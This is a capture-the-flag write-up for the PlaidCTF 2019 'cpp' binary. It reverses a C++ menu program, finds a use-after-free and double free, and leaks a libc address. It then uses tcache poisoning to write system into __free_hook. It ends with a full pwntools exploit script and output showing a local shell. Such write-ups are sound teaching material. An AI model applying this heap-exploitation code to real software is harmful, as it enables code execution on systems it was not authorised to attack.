# cpp plaid 2019

This writeup is based off of: https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-04-12-PlaidCTF/README.md#150-pwnable--cppp

We are given a binary and a `libc-2.27.so` libc file. Let's take a look at the binary:
```
$	pwn checksec cpp 
[*] '/Hackery/plaid19/cpp/cpp'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$	file cpp 
cpp: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9ccb6196788d9ba1e3953535628a62549f3bcce8, stripped
$	./cpp 
1. Add
2. Remove
3. View
4. Exit
Choice: 1
name: guy
buf: 20
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 3
0: guy
idx: 0
20
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 2
0: guy
idx: 0
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 4
Ok!
```

So we see we are given a 64 bit binary with RELRO, a stack canary, PIE and NX. The binary gives us four options, adding/removing/viewing/exiting.

### Reversing

When we start reversing this program, we see that it was written in C++. As such it is a bit of a pain to reverse, so a lot of the reversing was done in gdb (and I didn't fully reverse out everything). First off we see that it prompts us with for our menu option with the `promptMenu` function:

```
  menuOptions = promptMenu();
  v6 = __OFSUB__(menuOptions, 2);
  v4 = menuOptions == 2;
  v5 = menuOptions - 2 < 0;
  if ( menuOptions == 2 )
```

#### Add Option

Looking through the code for the Add option, we see that it prompts us for values for `name` and `buf`:

```
  std::operator<<<std::char_traits<char>>(&std::cout, "name: ");
  std::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin, &add_name);
  std::operator<<<std::char_traits<char>>(&std::cout, "buf: ");
  std::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin, &add_buff);
```

After that it creates strings for the corresponing values which are stored in the heap. When we look at the data structure for the strings, we can see that it is a pointer to the name accompanied with the length of the string (in this case the name is `sasori` and buf is `deidara`):

```
gef➤  x/10g 0x55555576a710
0x55555576a710:	0x0000000000000007	0x000055555576a7a0
0x55555576a720:	0x000055555576a730	0x0000000000000006
0x55555576a730:	0x000069726f736173	0x0000000000000000
0x55555576a740:	0x0000000000000006	0x000055555576a780
0x55555576a750:	0x000055555576a760	0x0000000000000006
gef➤  x/s 0x000055555576a7a0
0x55555576a7a0:	"deidara"
gef➤  x/s 0x000055555576a730
0x55555576a730:	"sasori"
```

Also one important thing to take note of (for later) the `buf` string is allocated prior to the `name` string. In addition to that for some reason the `buf` value is passed to free (I found this happening at `0x1fdd`). This means that if we can call `free` and pass an argument to it (will come in handy soon).

#### Remove Option

For this option it starts off by pompting us for an index with the `scan_index` function (this function also prints the indexes with the corresponding names). It then checks to ensure that the index provided is greater than or equal to 0:

```
    LODWORD(remove_index) = scanIndex();
    if ( (signed int)remove_index >= 0 )
    {
``` 

Proceeding that is a check to ensure that the index provided does have a corresponding object for it. If it isn't corresponding to an object, then this option does nothing:

```
      remove_index = (signed int)remove_index;
      if ( (signed int)remove_index < 0xAAAAAAAAAAAAAAABLL * ((bss1 - bss0) >> 4) )
      {
```

However what is interesting with this, is we see that the object that is freed isn't related to the index we provide. It takes the value stored in `bss1`, subtracts `0x28` from it, then deletes it. This doesn't necissarily coincide with the index we gave it: 

```
        freed_string = *(void **)(bss1 - 0x28);
        bss1 -= 48LL;
        if ( freed_string )
          operator delete[](freed_string);
```

When we look in a debugger, we see that it always frees (since the strings are stored in the heap) the last added string:

```
gef➤  pie b *0x167e
gef➤  pie run
Stopped due to shared library event (no libraries added or removed)
1. Add
2. Remove
3. View
4. Exit
Choice: 1
name: sasori
buf: deidara
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 1
name: hidan
buf: kakazu
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 2
0: sasori
1: hidan
idx: 0

.	.	.

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555672                  mov    QWORD PTR [rip+0x201bef], rax        # 0x555555757268
   0x555555555679                  test   rdi, rdi
   0x55555555567c                  je     0x555555555683
 → 0x55555555567e                  call   0x5555555551e0 <_ZdaPv@plt>
   ↳  0x5555555551e0 <operator+0>     jmp    QWORD PTR [rip+0x201d9a]        # 0x555555756f80
      0x5555555551e6 <operator+0>     push   0x15
      0x5555555551eb <operator+0>     jmp    0x555555555080
      0x5555555551f0 <__cxa_rethrow@plt+0> jmp    QWORD PTR [rip+0x201d92]        # 0x555555756f88
      0x5555555551f6 <__cxa_rethrow@plt+6> push   0x16
      0x5555555551fb <__cxa_rethrow@plt+11> jmp    0x555555555080
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
_ZdaPv@plt (
   $rdi = 0x000055555576a780 → 0x0000757a616b616b ("kakazu"?),
   $rsi = 0x000055555576a765 → 0x0000000000000000,
   $rdx = 0x0000000061646968,
   $rcx = 0x000000006e616469
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cpp", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555567e → call 0x5555555551e0 <_ZdaPv@plt>
[#1] 0x7ffff7464b97 → __libc_start_main(main=0x555555555290, argc=0x1, argv=0x7fffffffdf28, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf18)
[#2] 0x5555555558ea → hlt 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s $rdi
0x55555576a780:	"kakazu"

.	.	.
```

So we can see that we freed the strings associated with `hidan` and `kakazu` (please excuse the weeb references). When we go to view a string, we can see that we can reference the strings we freed and we see that we have what appaers to be some sort of infoleak:

```
gef➤  c
Continuing.

Program received signal SIGALRM, Alarm clock.
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 3
0: hidan
idx: 0
��vUUU
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 
```

With this we can see that we have a use after free bug, and a double free bug.

#### View Option

For the viewing option, we see that it prompts us for an index with the `scan_index` function. After that if we gave it a valid index, it will print the `buff` associated with that index:

```
    if ( menuOptions == 3 )
    {                                           // View Option
      LODWORD(v30) = scanIndex();
      if ( (signed int)v30 >= 0 )
      {
        v30 = (signed int)v30;
        if ( (signed int)v30 < 0xAAAAAAAAAAAAAAABLL * ((qword_203268 - qword_203260) >> 4) )
          puts(*(const char **)(qword_203260 + 48 * v30 + 8));
      }
      goto LABEL_19;
    }
```

### Exploitation

So we have a use after free. The plan is to first use that to get a libc infoleak. Then we will use the doubke free to cause tcache poisoning, which we will use to write the address of `system` to a free hook, then we will just free a string that points to `/bin/sh` to get a shell (which we can since the `buf` input is handed to free at `0x1fdd`). 

#### Infoleak

For this, we will have to groom the heap to get the libc infoleak. I did this via trial and error by adding various different strings, freeing them, and seeing what the heap looked like. In one case where I allocated strings of sizes `1` and `0x1000` and freed some of them (using the double free in this case), the heap looked like this: 

```
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55c1d3459772                  cmp    rax, rdx
   0x55c1d3459775                  jae    0x55c1d3459570
   0x55c1d345977b                  imul   rax, rax, 0x30
 → 0x55c1d345977f                  mov    rdi, QWORD PTR [rcx+rax*1+0x8]
   0x55c1d3459784                  call   0x55c1d3459210
   0x55c1d3459789                  jmp    0x55c1d3459570
   0x55c1d345978e                  lea    rdi, [rip+0x201acb]        # 0x55c1d365b260
   0x55c1d3459795                  mov    rdx, r13
   0x55c1d3459798                  mov    rsi, rbx
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cpp", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55c1d345977f → mov rdi, QWORD PTR [rcx+rax*1+0x8]
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x000055c1d345977f in ?? ()
gef➤  p $rcx
$1 = 0x55c1d486fe10
gef➤  telescope 0x55c1d486fe10
0x000055c1d486fe10│+0x0000: 0x00007f4300000001   ← $rcx
0x000055c1d486fe18│+0x0008: 0x000055c1d486ff00  →  0x00007f4335a00031  →  0x00007f4335a00031
```

In this case it would try and print the contents of the address `0x000055c1d486ff00`, which would be the libc address `0x00007f4335a00031`. However since the output is printed using `puts` (which stops when it hits a null byte) and since the second byte of that address is a null byte, we wouldn't get the full libc address in this case.

With a bit of trial and error, I find that doing this combination of adding / removing will leak a libc address (this address points to a heap pointer):

```
add("0", "1")
add("2"*0x1000, "3"*0x1000)
add("3", "4")
add("3", "4")
add("3", "4")
add("3", "4")

#add("4", "5")

remove(5)
remove(4)
remove(3)
remove(2)
remove(0)

print hex(view(0))
```

With that we have our libc infoleak.

#### tcache posioning / free hook write

The second step to this exploit is writing over one of the free hooks via tcache posioning. First thing, when we look at the `malloc.c` source code (can be found here https://ftp.gnu.org/gnu/glibc/), we see the structs by a tcache bin (checkout http://eternal.red/2018/children_tcache-writeup-and-tcache-overview/ for more info on this attack):

```
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

```

Each bin has a `tcache_perthread_struct` struct, while each entry has a `tcache_entry` struct. When a memory chunk of a certain size is freed (if the bin has not exceeded `TCACHE_MAX_BINS` which default is 7) then it is put at the front of the linked list of chunks as a `tcache_entry`, with it's pointer set equal to the previous linked list head (FILO structue). Here is the code to add / remove entries from a tcache bin to make it a bit more clear:

```
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

So we can see that the entires only point to the next entry in the list. We will use this and the lack of checks it does for corruption to our advantage. We will use the double free bug to free a chunk twice. This will cause there two entries in the tcache bin for a single memory chunk. Then we will allocate one of those two chunks, which will allow us to write to a chunk that is in the tcache list (since they both point to the same chunk). We will write to it the address of the free hook, which will overwrite the `tcache_entry->next` pointer to the address of `__free_hook`. Then we will allocate that chunk, which will set the next chunk to be allocated to be pointing at the free hook (luckily for us this is taken care of by the fact that whenever we add an object, two different chunks are allocated). Then the next chunk we allocate will be pointing at the free hook, which we can just write the address of `system` to the free hook. Then we will just need to create a chunk with the `buf` value `/bin/sh` and we will have our shell.

Also one more thing I will say about this, due to how I did the infoleak the tcache bin is already pretty full. So I allocated five new objects to clear everything out, then did the double free and proceeded with the tcache poisoning / free hook overwrite.

### Exploit

Putting it all together, we get the following exploit:

```
# This exploit is based off of: https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-04-12-PlaidCTF/README.md#150-pwnable--cppp

from pwn import *

target = process('./cpp', env={"LD_PRELOAD":"./libc-2.27.so"})

gdb.attach(target)
#gdb.attach(target, gdbscript = 'pie b *0x167e')
#gdb.attach(target, gdbscript = 'pie b *0x1475')

libc = ELF("./libc-2.27.so")

# Establish functions to handle I/O with target
def add(name, buff):
    print target.recvuntil("Exit\n")
    target.sendline("1")
    target.sendline(name)
    print target.recvuntil("buf:")
    target.sendline(buff)
    print target.recvuntil("Done!")

def remove(index):
    print target.recvuntil("Exit\n")
    target.sendline("2")
    print target.recvuntil("idx: ")
    target.sendline(str(index))
    print target.recvuntil("Done!")

def view(index):
     print target.recvuntil("Exit\n")
     target.sendline("3")
     print target.recvuntil("idx: ")
     target.sendline(str(index))
     leak = target.recvline()
     leak = leak.strip("\n")
     leak = u64(leak + "\x00"*(8-len(leak)))
     print target.recvuntil("Done!")
     return leak


# Add the strings for the libc infoleak
add("0", "1")
add("2"*0x1000, "3"*0x1000)
add("3", "4")
add("3", "4")
add("3", "4")
add("3", "4")

# Remove the strings to groom the heap for the libc infoleak
remove(5)
remove(4)
remove(3)
remove(2)
remove(0)

# Leak the libc address, and calculate the base
libcLeak = view(0)
libcBase = libcLeak - 0x3ebca0
log.info("libc base: " + hex(libcBase))

# Clear out the tcache (this and the next block)
add("1", "1")
add("1", "1")
add("1", "1")

# Setup double free for tcache poisoning (finish clearing out tcache)
add("1", "1")
add("2", "2")

# Execute tcache poisoning via double free
remove(1)
remove(1)

# Use double free to allocate chunk that is also in tcache bin
# Overwrite next pointer for tcache entry at the head with that of __free_hook
# Also allocate next chunk, so next chunk allocated will be to __free_hook
add("15935728", p64(libcBase + libc.symbols["__free_hook"]))

# Allocate next chunk from tcache_bin which will be to __free_hook
# Write libc address of system to it
add("1", p64(libcBase + libc.symbols["system"]))

# Execute system("/bin/sh")
# Buf string is passed to free, which we overwrote __free_hook with system
target.sendline("1")
target.recvuntil("name: ")
target.sendline("guyinatuxedo")
target.recvuntil("buf: ")
target.sendline("/bin/sh")

# Drop to an interactive shell
target.interactive()
```

When we run it:

```
$ python exploit.py 
[+] Starting local process './cpp': pid 7088
[*] running in new terminal: /usr/bin/gdb -q  "./cpp" 7088 -x "/tmp/pwnVOLutL.gdb"
[+] Waiting for debugger: Done
[*] '/Hackery/plaid19/cpp/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
1. Add
2. Remove
3. View
4. Exit

. . .

1. Add
2. Remove
3. View
4. Exit

Choice: name: buf:
 Done!

1. Add
2. Remove
3. View
4. Exit

Choice: name: buf:
 sh: 1: @D\x0f#W\x7f: not found
Done!
[*] Switching to interactive mode
$ w
 00:48:38 up  7:54,  1 user,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               16:54   ?xdm?   2:47   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
core  exploit.py  glibc-2.27.tar.gz  solve.py
cpp   glibc-2.27  libc-2.27.so         try.py
```
